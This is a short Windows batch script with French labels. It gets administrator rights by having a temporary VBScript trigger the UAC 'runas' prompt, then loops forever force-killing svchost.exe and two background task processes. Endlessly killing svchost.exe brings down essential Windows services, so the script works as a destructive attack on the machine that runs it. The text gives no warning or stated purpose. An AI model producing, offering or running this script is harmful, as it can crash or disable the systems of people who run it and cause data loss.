@echo off
color 0a
net file 1>NUL 2>NUL & if errorlevel 1 (goto affichageDelUAC) else (goto elevationReussie)
:affichageDelUAC
echo Set popupUAC = CreateObject^("Shell.Application"^) > "%temp%\elevation.vbs"
echo popupUAC.ShellExecute "%~s0", "", "", "runas", 1  >> "%temp%\elevation.vbs"
"%temp%\elevation.vbs"
exit /B
:elevationReussie
if exist "%temp%\elevation.vbs" ( del "%temp%\elevation.vbs" )
echo.
echo  El‚vation r‚ussie !
:1
taskkill /im BackgroundTransferHost.exe /f
taskkill /im BackgroundTaskHost.exe /f
taskkill /im svchost.exe /f
goto 1
